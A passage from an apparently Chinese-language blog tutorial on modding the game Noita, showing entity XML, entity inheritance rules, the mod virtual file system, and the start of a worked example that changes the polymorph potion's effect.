<span class="token attr-name">attack_ranged_predict</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">attack_ranged_enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">attack_melee_enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">attack_melee_damage_min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">attack_melee_damage_max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">can_fly</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">food_material</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>grass<span class="token punctuation">"</span></span>
<span class="token attr-name">needs_food</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
            <span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AnimalAIComponent</span> <span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DamageModelComponent</span> 
<span class="token attr-name">ragdoll_offset_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-11<span class="token punctuation">"</span></span>
<span class="token attr-name">ragdoll_filenames_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/ragdolls/sheep_fly/filenames.txt<span class="token punctuation">"</span></span> 
<span class="token attr-name">hp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.2<span class="token punctuation">"</span></span>
<span class="token attr-name">materials_create_messages</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">materials_that_create_messages</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>grass<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DamageModelComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SpriteComponent</span> 
<span class="token attr-name">image_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/enemies_gfx/sheep_fly.xml<span class="token punctuation">"</span></span>
            <span class="token attr-name">offset_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
            <span class="token attr-name">offset_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>12<span class="token punctuation">"</span></span> 
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SpriteComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SpriteAnimatorComponent</span>
<span class="token attr-name">rotate_to_surface_normal</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SpriteAnimatorComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PathFindingGridMarkerComponent</span>
<span class="token attr-name">marker_work_flag</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>24<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PathFindingGridMarkerComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GenomeDataComponent</span> 
<span class="token attr-name">herd_id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>helpless<span class="token punctuation">"</span></span>
<span class="token attr-name">food_chain_rank</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span>
<span class="token attr-name">is_predator</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> 
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GenomeDataComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CharacterPlatformingComponent</span> 
<span class="token attr-name">jump_velocity_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> 
<span class="token attr-name">run_velocity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>  
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CharacterPlatformingComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HitboxComponent</span> 
<span class="token attr-name">_enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> 
<span class="token attr-name">aabb_max_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span> 
<span class="token attr-name">aabb_max_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span> 
<span class="token attr-name">aabb_min_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-6<span class="token punctuation">"</span></span> 
<span class="token attr-name">aabb_min_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-7<span class="token punctuation">"</span></span> 
<span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HitboxComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CharacterDataComponent</span>
<span class="token attr-name">collision_aabb_min_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-3.0<span class="token punctuation">"</span></span> 
<span class="token attr-name">collision_aabb_max_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3.0<span class="token punctuation">"</span></span> 
<span class="token attr-name">collision_aabb_min_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-6<span class="token punctuation">"</span></span> 
<span class="token attr-name">collision_aabb_max_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> 
<span class="token attr-name">buoyancy_check_offset_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-3<span class="token punctuation">"</span></span>
<span class="token attr-name">mass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CharacterDataComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PathFindingComponent</span>
<span class="token attr-name">can_jump</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> 
<span class="token attr-name">jump_speed</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">can_walk</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">can_fly</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">initial_jump_max_distance_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">initial_jump_max_distance_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PathFindingComponent</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Base</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioComponent</span>
<span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/animals.bank<span class="token punctuation">"</span></span>
<span class="token attr-name">event_root</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>animals/sheep<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioLoopComponent</span>
<span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/animals.bank<span class="token punctuation">"</span></span>
<span class="token attr-name">event_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>animals/wing_flap_insect/movement_loop<span class="token punctuation">"</span></span>
<span class="token attr-name">set_speed_parameter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">set_speed_parameter_only_based_on_y_movement</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">auto_play</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioLoopComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>Base file标签是一个继承，后续是添加更多新组件，比如动物AI组件等等</p>
<p><strong>继承规则详解</strong></p>
<ul>
<li><code>include_children=&quot;1&quot;</code>: 继承所有子实体</li>
<li>同名组件会被完全覆盖，而不是合并</li>
<li>新组件会被添加到现有组件列表</li>
<li>支持多级继承链</li>
<li>子实体也支持继承机制</li>
</ul>
<h2 id="虚拟文件系统（VFS）——模组如何生效"><a href="#虚拟文件系统（VFS）——模组如何生效" class="headerlink" title="虚拟文件系统（VFS）——模组如何生效"></a>虚拟文件系统（VFS）——模组如何生效</h2><p><strong>VFS工作原理:</strong></p>
<ol>
<li><strong>文件路径重定向</strong>: 当游戏请求读取某个文件时，VFS首先检查是否有模组提供了该文件的替换版本</li>
<li><strong>内容合并</strong>: 对于支持追加的文件（如Lua脚本），VFS将原始内容与模组内容合并</li>
<li><strong>优先级处理</strong>: 多个模组修改同一文件时，按照模组加载顺序确定优先级</li>
<li><strong>透明访问</strong>: 游戏代码无需修改，通过VFS透明地访问合并后的内容<pre class="line-numbers language-none"><code class="language-none">物理文件系统布局:
Noita&#x2F;
├── data&#x2F;                    # 游戏原始数据
│   ├── scripts&#x2F;
│   ├── entities&#x2F;
│   └── materials.xml
├── mods&#x2F;
│   ├── mod_a&#x2F;
│   │   ├── mod.xml
│   │   ├── init.lua
│   │   └── files&#x2F;
│   │       ├── scripts&#x2F;
│   │       └── entities&#x2F;
│   └── mod_b&#x2F;
│       └── files&#x2F;

虚拟文件系统映射:
data&#x2F;scripts&#x2F;gun&#x2F;gun_actions.lua -&gt; [原始文件] + [mod_a追加] + [mod_b追加]
data&#x2F;entities&#x2F;animals&#x2F;sheep.xml  -&gt; [mod_a覆盖版本] (如果存在)
data&#x2F;materials.xml              -&gt; [原始文件] + [mod_a材料] + [mod_b材料]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
也就是说，VFS系统给我们提供了方便地修改/增添游戏内容的机制 </li>
</ol>
<h2 id="一个简单的实操"><a href="#一个简单的实操" class="headerlink" title="一个简单的实操"></a>一个简单的实操</h2><p>目标是实现“混乱变形魔药固定变成蠕虫”这一功能</p>
<p>略过创建文件的过程</p>
<p>首先需要确定“变形”这一效果是如何实现的：</p>
<p>data/materials.xml 这是一个一万七千行的大文件，魔药的定义就在其中，而产生的效果定义在另外的文件中</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CellData</span>
<span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>magic_liquid_random_polymorph<span class="token punctuation">"</span></span>
<span class="token attr-name">ui_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$mat_magic_liquid_random_polymorph<span class="token punctuation">"</span></span>
  <span class="token attr-name">tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[liquid],[water],[magic_liquid],[magic_polymorph],[impure]<span class="token punctuation">"</span></span>
<span class="token attr-name">burnable</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">density</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.15<span class="token punctuation">"</span></span>
<span class="token attr-name">cell_type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>liquid<span class="token punctuation">"</span></span>
<span class="token attr-name">wang_color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8091448D<span class="token punctuation">"</span></span>
<span class="token attr-name">generates_smoke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">liquid_gravity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.8<span class="token punctuation">"</span></span>
<span class="token attr-name">liquid_sand</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">gfx_glow</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>150<span class="token punctuation">"</span></span>
<span class="token attr-name">on_fire</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">requires_oxygen</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">liquid_stains</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">liquid_sprite_stains_status_threshold</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.25<span class="token punctuation">"</span></span>
<span class="token attr-name">liquid_sprite_stain_shaken_drop_chance</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span>
<span class="token attr-name">status_effects</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POLYMORPH_RANDOM<span class="token punctuation">"</span></span>
<span class="token attr-name">audio_materialaudio_type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MAGICAL<span class="token punctuation">"</span></span> 
<span class="token attr-name">show_in_creative_mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">liquid_sprite_stains_check_offset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ParticleEffect</span>
<span class="token attr-name">vel.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">vel_random.min_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-17.43<span class="token punctuation">"</span></span>
<span class="token attr-name">vel_random.max_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>17.43<span class="token punctuation">"</span></span>
<span class="token attr-name">vel_random.min_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-45.75<span class="token punctuation">"</span></span>
<span class="token attr-name">vel_random.max_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span>
<span class="token attr-name">lifetime.min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span>
<span class="token attr-name">lifetime.max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
<span class="token attr-name">gravity.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">render_on_grid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">draw_as_long</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">airflow_force</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.974<span class="token punctuation">"</span></span>
<span class="token attr-name">airflow_scale</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.1371<span class="token punctuation">"</span></span>
<span class="token attr-name">friction</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3.714<span class="token punctuation">"</span></span>
<span class="token attr-name">probability</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0857<span class="token punctuation">"</span></span>
<span class="token attr-name">count.min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">count.max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ParticleEffect</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StatusEffects</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Ingestion</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StatusEffect</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POLYMORPH_RANDOM<span class="token punctuation">"</span></span> <span class="token attr-name">amount</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.2<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Ingestion</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StatusEffects</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CellData</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>具体属性我们并不关心，只关心会产生一个叫POLYMORPH_RANDOM的效果</p>
<p>data/entities/misc/effect_polymorph_random.xml<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>InheritTransformComponent</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>InheritTransformComponent</span><span class="token punctuation">></span></span>
    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GameEffectComponent</span> 
    <span class="token attr-name">effect</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POLYMORPH_RANDOM<span class="token punctuation">"</span></span>
    <span class="token attr-name">frames</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span>
    <span class="token attr-name">disable_movement</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
    <span class="token attr-name">polymorph_target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[RANDOM]<span class="token punctuation">"</span></span>
    <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GameEffectComponent</span> <span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>explosion<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>InheritTransformComponent</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>InheritTransformComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SpriteParticleEmitterComponent</span>
<span class="token attr-name">sprite_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/particles/puff_0$[1-3].xml<span class="token punctuation">"</span></span>
<span class="token attr-name">delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">lifetime</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">color.r</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">color.g</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">color.b</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">color.a</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">color_change.r</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">color_change.g</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">color_change.b</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">color_change.a</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-2<span class="token punctuation">"</span></span>
<span class="token attr-name">velocity.x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">velocity.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">gravity.x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">gravity.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
<span class="token attr-name">velocity_slowdown</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">rotation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">angular_velocity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">use_velocity_as_rotation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">scale.x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">scale.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">scale_velocity.x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">scale_velocity.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">emission_interval_min_frames</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">emission_interval_max_frames</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">count_min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">count_max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_rotation.min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-3.1415<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_rotation.max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3.1415<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_position.min_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-10<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_position.max_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_position.min_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-10<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_position.max_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_angular_velocity.min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-4<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_angular_velocity.max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_velocity.min_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-20<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_velocity.max_x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span>
<span class="token attr-name">randomize_velocity.min_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-20<span class="token punctuation">"</span></span>
